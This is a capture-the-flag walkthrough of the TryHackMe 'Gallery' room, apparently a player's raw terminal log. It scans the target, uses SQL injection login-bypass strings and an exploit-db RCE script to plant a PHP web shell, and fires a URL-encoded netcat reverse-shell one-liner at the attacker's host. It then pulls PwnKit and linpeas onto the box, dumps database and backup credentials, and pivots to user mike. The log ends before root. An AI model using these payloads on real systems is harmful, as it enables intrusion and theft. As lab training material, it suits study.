---
Try to exploit our image gallery system
---

![111](https://tryhackme-images.s3.amazonaws.com/room-icons/c53a8eb73f24535345477fdf603fe1de.png)



### Deploy and get a Shell

Our gallery is not very well secured.

Designed and created by [Mikaa](https://twitter.com/mika_sec) !

```
https://mikadmin.fr/blog/pentest-cheatsheet/

https://gist.github.com/jesusgavancho/d0063a1de1a91839b79914e552cfc507

┌──(kali㉿kali)-[~/php-8.1.0-dev-backdoor-rce]
└─$  whoami | figlet
 _         _ _ 
| | ____ _| (_)
| |/ / _` | | |
|   < (_| | | |
|_|\_\__,_|_|_|


┌──(kali㉿kali)-[~/php-8.1.0-dev-backdoor-rce]
└─$ rustscan -a 10.10.19.103 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.19.103:80
Open 10.10.19.103:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-23 14:13 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.00s elapsed
Initiating Ping Scan at 14:13
Scanning 10.10.19.103 [2 ports]
Completed Ping Scan at 14:13, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:13
Completed Parallel DNS resolution of 1 host. at 14:13, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 14:13
Scanning 10.10.19.103 [2 ports]
Discovered open port 8080/tcp on 10.10.19.103
Discovered open port 80/tcp on 10.10.19.103
Completed Connect Scan at 14:13, 0.19s elapsed (2 total ports)
Initiating Service scan at 14:13
Scanning 2 services on 10.10.19.103
Completed Service scan at 14:13, 6.43s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.19.103.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 5.94s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.78s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.00s elapsed
Nmap scan report for 10.10.19.103
Host is up, received syn-ack (0.19s latency).
Scanned at 2022-12-23 14:13:30 EST for 14s

PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
8080/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Simple Image Gallery System
|_http-favicon: Unknown favicon MD5: AC2148CFC4ABD06702A26F4F7CB95E09
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:13
Completed NSE at 14:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.68 seconds

http://10.10.19.103:8080

http://10.10.19.103/gallery/login.php

sqli

admin'#

' or 1=1-- j

' or 1=1#

' or "x"="x"-- -

┌──(kali㉿kali)-[~/php-8.1.0-dev-backdoor-rce]
└─$ searchsploit Simple Image Gallery   
------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                           |  Path
------------------------------------------------------------------------- ---------------------------------
Joomla Plugin Simple Image Gallery Extended (SIGE) 3.5.3 - Multiple Vuln | php/webapps/49064.txt
Joomla! Component Kubik-Rubik Simple Image Gallery Extended (SIGE) 3.2.3 | php/webapps/44104.txt
Simple Image Gallery 1.0 - Remote Code Execution (RCE) (Unauthenticated) | php/webapps/50214.py
Simple Image Gallery System 1.0 - 'id' SQL Injection                     | php/webapps/50198.txt
------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(kali㉿kali)-[~/php-8.1.0-dev-backdoor-rce]
└─$ searchsploit -m php/webapps/50214.py 
  Exploit: Simple Image Gallery 1.0 - Remote Code Execution (RCE) (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/50214
     Path: /usr/share/exploitdb/exploits/php/webapps/50214.py
    Codes: N/A
 Verified: False
File Type: Python script, Unicode text, UTF-8 text executable, with very long lines (816)
Copied to: /home/kali/php-8.1.0-dev-backdoor-rce/50214.py


┌──(kali㉿kali)-[~/php-8.1.0-dev-backdoor-rce]
└─$ python3 50214.py   
TARGET = http://10.10.19.103:8080
Login Bypass
shell name TagokwdmwsifjbuowqbLetta

protecting user

User ID : 1
Firsname : Adminstrator
Lasname : Admin
Username : admin

shell uploading
- OK -
Shell URL : http://10.10.19.103/gallery/uploads/1671824700_TagokwdmwsifjbuowqbLetta.php?cmd=whoami


url encode rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.19.103 1337 >/tmp/f (cyberchef)

encode all special characters

rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E8%2E19%2E103%201337%20%3E%2Ftmp%2Ff

now will be

http://10.10.19.103/gallery/uploads/1671824700_TagokwdmwsifjbuowqbLetta.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E8%2E19%2E103%201337%20%3E%2Ftmp%2Ff

revshell

┌──(kali㉿kali)-[~/php-8.1.0-dev-backdoor-rce]
└─$ rlwrap nc -lnvp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.19.103.
Ncat: Connection from 10.10.19.103:44588.
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ pwd
/var/www/html/gallery/uploads
$ ls
1671824700_TagokwdmwsifjbuowqbLetta.php
gallery.png
no-image-available.png
user_1
$ cd ..
$ ls
404.html
albums
archives
assets
build
classes
config.php
create_account.php
database
dist
home.php
inc
index.php
initialize.php
login.php
plugins
report
schedules
system_info
uploads
user
$ cat initialize.php
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');

if(!defined('base_url')) define('base_url',"http://" . $_SERVER['SERVER_ADDR'] . "/gallery/");
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"passw0rd321");
if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
?>

gallery_user:passw0rd321

let's stabilize shell

┌──(kali㉿kali)-[~/php-8.1.0-dev-backdoor-rce]
└─$ rlwrap nc -lnvp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.19.103.
Ncat: Connection from 10.10.19.103:44590.
/bin/sh: 0: can't access tty; job control turned off
$ export TERM=xterm
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@gallery:/var/www/html/gallery/uploads$ 
zsh: suspended  rlwrap nc -lnvp 1337
                                                                                                           
┌──(kali㉿kali)-[~/php-8.1.0-dev-backdoor-rce]
└─$ stty raw -echo ; fg
[1]  + continued  rlwrap nc -lnvp 1337
www-data@gallery:/var/www/html/gallery/uploads$ reset


www-data@gallery:/var/www/html/gallery/uploads$ mysql -u gallery_user -p
mysql -u gallery_user -p
Enter password: passw0rd321

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 616
Server version: 10.1.48-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| gallery_db         |
| information_schema |
+--------------------+
2 rows in set (0.00 sec)

MariaDB [(none)]> use gallery_db;
use gallery_db;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [gallery_db]> show tables;
show tables;
+----------------------+
| Tables_in_gallery_db |
+----------------------+
| album_list           |
| images               |
| system_info          |
| users                |
+----------------------+
4 rows in set (0.00 sec)

MariaDB [gallery_db]> select * from users;
select * from users;
+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
| id | firstname    | lastname | username | password                         | avatar                                          | last_login | type | date_added          | date_updated        |
+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
|  1 | Adminstrator | Admin    | admin    | a228b12a08b6527e7978cbe5d914531c | uploads/1671824700_TagokwdmwsifjbuowqbLetta.php | NULL       |    1 | 2021-01-20 14:02:37 | 2022-12-23 19:45:16 |
+----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
1 row in set (0.00 sec)

MariaDB [gallery_db]> quit
quit
Bye

https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c

┌──(kali㉿kali)-[~/Downloads/pwnkit/true]
└─$ nano PwnKit.c 
                                                                                                           
┌──(kali㉿kali)-[~/Downloads/pwnkit/true]
└─$ gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
                                                                                                           
┌──(kali㉿kali)-[~/Downloads/pwnkit/true]
└─$ ls
PwnKit  PwnKit.c

┌──(kali㉿kali)-[~/Downloads/pwnkit/true]
└─$ python3 -m http.server 80                        
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.19.103 - - [23/Dec/2022 15:09:22] "GET /PwnKit HTTP/1.1" 200 -


www-data@gallery:/tmp$ mkdir witty
mkdir witty
www-data@gallery:/tmp$ cd witty
cd witty
www-data@gallery:/tmp/witty$ ls
ls
www-data@gallery:/tmp/witty$ wget http://10.8.19.103:80/PwnKit
wget http://10.8.19.103:80/PwnKit
--2022-12-23 20:09:22--  http://10.8.19.103/PwnKit
Connecting to 10.8.19.103:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16800 (16K) [application/octet-stream]
Saving to: 'PwnKit'

PwnKit              100%[===================>]  16.41K  83.9KB/s    in 0.2s    

2022-12-23 20:09:23 (83.9 KB/s) - 'PwnKit' saved [16800/16800]

www-data@gallery:/tmp/witty$ chmod +x PwnKit
chmod +x PwnKit
www-data@gallery:/tmp/witty$ ./PwnKit
./PwnKit
www-data@gallery:/tmp/witty$ Exploit failed. Target is most likely patched.
whoami
whoami
www-data

┌──(kali㉿kali)-[~/Downloads/pwnkit/true]
└─$ locate linpeas
/home/kali/Downloads/linpeas.sh
/home/kali/hackthebox/linpeas.sh

                                                                                                           
┌──(kali㉿kali)-[~/Downloads/pwnkit/true]
└─$ cd ../..        
                                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.19.103 - - [23/Dec/2022 15:14:02] "GET /linpeas.sh HTTP/1.1" 200 -

www-data@gallery:/tmp/witty$ wget http://10.8.19.103:80/linpeas.sh
wget http://10.8.19.103:80/linpeas.sh
--2022-12-23 20:14:01--  http://10.8.19.103/linpeas.sh
Connecting to 10.8.19.103:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 777018 (759K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 758.81K   425KB/s    in 1.8s    

2022-12-23 20:14:04 (425 KB/s) - 'linpeas.sh' saved [777018/777018]

www-data@gallery:/tmp/witty$ ls
ls
PwnKit  linpeas.sh
www-data@gallery:/tmp/witty$ chmod +x linpeas.sh
chmod +x linpeas.sh


let's see

www-data@gallery:/tmp/witty$ ./linpeas.sh
./linpeas.sh


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄                                                
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------\
    |                             Do you like PEASS?                            |                          
    |---------------------------------------------------------------------------|                          
    |         Get latest LinPEAS  :     https://github.com/sponsors/carlospolop |                          
    |         Follow on Twitter   :     @carlospolopm                           |                          
    |         Respect on HTB      :     SirBroccoli                             |                          
    |---------------------------------------------------------------------------|                          
    |                                 Thank you!                                |                          
    \---------------------------------------------------------------------------/                          
          linpeas-ng by carlospolop                                                                        
                                                                                                           
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                       
                                                                                                           
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                   
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                                         ╔═══════════════════╗                                             
═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════    
                                         ╚═══════════════════╝                                             
OS: Linux version 4.15.0-167-generic (buildd@lcy02-amd64-045) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #175-Ubuntu SMP Wed Jan 5 01:56:07 UTC 2022
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: gallery
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                                         
                                                                                                           

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE     
                                                                                                           
                                        ╔════════════════════╗
════════════════════════════════════════╣ System Information ╠════════════════════════════════════════     
                                        ╚════════════════════╝                                             
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                         
Linux version 4.15.0-167-generic (buildd@lcy02-amd64-045) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #175-Ubuntu SMP Wed Jan 5 01:56:07 UTC 2022
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.6 LTS
Release:        18.04
Codename:       bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                            
Sudo version 1.8.21p2                                                                                      

╔══════════╣ CVEs Check
./linpeas.sh: 1197: ./linpeas.sh: [[: not found
./linpeas.sh: 1197: ./linpeas.sh: rpm: not found
./linpeas.sh: 1197: ./linpeas.sh: 0: not found
./linpeas.sh: 1207: ./linpeas.sh: [[: not found


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                    
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                               
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Date & uptime
Fri Dec 23 20:14:46 UTC 2022                                                                               
 20:14:46 up  1:25,  0 users,  load average: 0.71, 0.16, 0.05

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                       

╔══════════╣ Unmounted file-system?
╚ Check if you can mount unmounted devices                                                                 
/dev/disk/by-id/dm-uuid-LVM-47UUMpglUmCIKjJ4GwkEigDxsGED6f6WQzTFdTLYy6BOxYoOHUDSOFOIqUeVGqTE    /       ext4       defaults        0 0
/dev/disk/by-uuid/7db5879e-36e2-4ee4-b7e4-d6008335b7c9  /boot   ext4    defaults        0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                    
HISTFILESIZE=0                                                                                             
SHLVL=1
OLDPWD=/tmp
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
JOURNAL_STREAM=9:19684
_=./linpeas.sh
TERM=xterm
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
INVOCATION_ID=2dd5bfc1483243d7b9a0dddb62e3c063
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_GROUP=www-data
APACHE_RUN_USER=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/tmp/witty
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed     
dmesg Not Found                                                                                            
                                                                                                           
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                         
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.




╔══════════╣ Searching passwords in history files
      @stats   = stats                                                                                     
      @items   = { _seq_: 1  }
      @threads = { _seq_: "A" }
sudo -lb3stpassw0rdbr0xx
sudo -l

b3stpassw0rdbr0xx


www-data@gallery:/tmp/witty$ cd /var/
cd /var/
www-data@gallery:/var$ ls
ls
backups  cache  crash  lib  local  lock  log  mail  opt  run  spool  tmp  www
www-data@gallery:/var$ cd backups
cd backups
www-data@gallery:/var/backups$ ls
ls
apt.extended_states.0     apt.extended_states.2.gz  mike_home_backup
apt.extended_states.1.gz  apt.extended_states.3.gz
www-data@gallery:/var/backups$ cd mike_home_backup
cd mike_home_backup
www-data@gallery:/var/backups/mike_home_backup$ ls
ls
documents  images
www-data@gallery:/var/backups/mike_home_backup$ cd documents
cd documents
www-data@gallery:/var/backups/mike_home_backup/documents$ ls
ls
accounts.txt
www-data@gallery:/var/backups/mike_home_backup/documents$ cat accounts.txt
cat accounts.txt
Spotify : mike@gmail.com:mycat666
Netflix : mike@gmail.com:123456789pass
TryHackme: mike:darkhacker123

www-data@gallery:/var/backups/mike_home_backup/documents$ cd ..
cd ..
www-data@gallery:/var/backups/mike_home_backup$ ls
ls
documents  images
www-data@gallery:/var/backups/mike_home_backup$ cd images
cd images
www-data@gallery:/var/backups/mike_home_backup/images$ ls
ls
23-04.jpg  26-04.jpg  my-cat.jpg
www-data@gallery:/var/backups/mike_home_backup/images$ cd ..
cd ..
www-data@gallery:/var/backups/mike_home_backup$ ls
ls
documents  images
www-data@gallery:/var/backups/mike_home_backup$ ls -lah
ls -lah
total 36K
drwxr-xr-x 5 root root 4.0K May 24  2021 .
drwxr-xr-x 3 root root 4.0K Dec 23 18:51 ..
-rwxr-xr-x 1 root root  135 May 24  2021 .bash_history
-rwxr-xr-x 1 root root  220 May 24  2021 .bash_logout
-rwxr-xr-x 1 root root 3.7K May 24  2021 .bashrc
drwxr-xr-x 3 root root 4.0K May 24  2021 .gnupg
-rwxr-xr-x 1 root root  807 May 24  2021 .profile
drwxr-xr-x 2 root root 4.0K May 24  2021 documents
drwxr-xr-x 2 root root 4.0K May 24  2021 images
www-data@gallery:/var/backups/mike_home_backup$ cat .bash_history
cat .bash_history
cd ~
ls
ping 1.1.1.1
cat /home/mike/user.txt
cd /var/www/
ls
cd html
ls -al
cat index.html
sudo -lb3stpassw0rdbr0xx
clear
sudo -l
exit

www-data@gallery:/var/backups/mike_home_backup$ su mike
su mike
Password: b3stpassw0rdbr0xx

mike@gallery:/var/backups/mike_home_backup$ whoami                      
whoami
mike

mike@gallery:/var/backups/mike_home_backup$ cd /home                                   
cd /home
mike@gallery:/home$ ls          
ls
mike  ubuntu
mike@gallery:/home$ cd mike          
cd mike
mike@gallery:~$ ls          
ls
documents  images  user.txt
mike@gallery:~$ cat user.txt   cat user.txt
cat user.txt
THM{af05cd30bfed67849befd546ef}

privesc

mike@gallery:~$ sudo -l        
sudo -l
Matching Defaults entries for mike on gallery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on gallery:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh

mike@gallery:~$ cat /opt/rootkicat
cat /opt/rootkit.sh
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac


Este código es un script de bash que permite a un usuario ejecutar distintas opciones utilizando el programa "rkhunter". "rkhunter" es una herramienta de seguridad que se utiliza para detectar posibles rootkits en sistemas basados en Unix.

El script comienza leyendo una entrada del usuario a través de la instrucción "read". La entrada del usuario se almacena en la variable "ans". Luego, se utiliza la instrucción "case" para realizar una comparación entre la entrada del usuario y varias opciones predefinidas. Si la entrada del usuario coincide con una de las opciones, se ejecuta el código correspondiente. Las opciones disponibles son:

-   versioncheck: ejecuta el comando "rkhunter --versioncheck", que muestra la versión del programa "rkhunter" instalada en el sistema.
-   update: ejecuta el comando "rkhunter --update", que actualiza la base de datos de rootkits utilizada por "rkhunter".
-   list: ejecuta el comando "rkhunter --list", que muestra una lista de todos los archivos verificados por "rkhunter".
-   read: abre el archivo "report.txt" en el editor de texto "nano" y permite al usuario leerlo.
-   *: si la entrada del usuario no coincide con ninguna de las opciones anteriores, se ejecuta la instrucción "exit", que finaliza el script.


mike@gallery:~$ sudo /bin/bash sudo /bin/bash /opt/rootkit.sh
sudo /bin/bash /opt/rootkit.sh
Would you like to versioncheck, update, list or read the report ? list
list

Current test names:
    additional_rkts all apps attributes avail_modules deleted_files
    filesystem group_accounts group_changes hashes hidden_ports hidden_procs
    immutable ipc_shared_mem known_rkts loaded_modules local_host login_backdoors
    malware network none os_specific packet_cap_apps passwd_changes
    ports possible_rkt_files possible_rkt_strings promisc properties rootkits
    running_procs scripts shared_libs shared_libs_path sniffer_logs startup_files
    startup_malware strings susp_dirs suspscan system_commands system_configs
    system_configs_ssh system_configs_syslog tripwire trojans

Grouped test names:
    additional_rkts => possible_rkt_files possible_rkt_strings 
    group_accounts  => group_changes passwd_changes 
    local_host      => filesystem group_changes passwd_changes startup_malware system_configs_ssh system_configs_syslog 
    malware         => deleted_files hidden_procs ipc_shared_mem login_backdoors running_procs sniffer_logs susp_dirs suspscan tripwire 
    network         => hidden_ports packet_cap_apps ports promisc 
    os_specific     => avail_modules loaded_modules 
    properties      => attributes hashes immutable scripts 
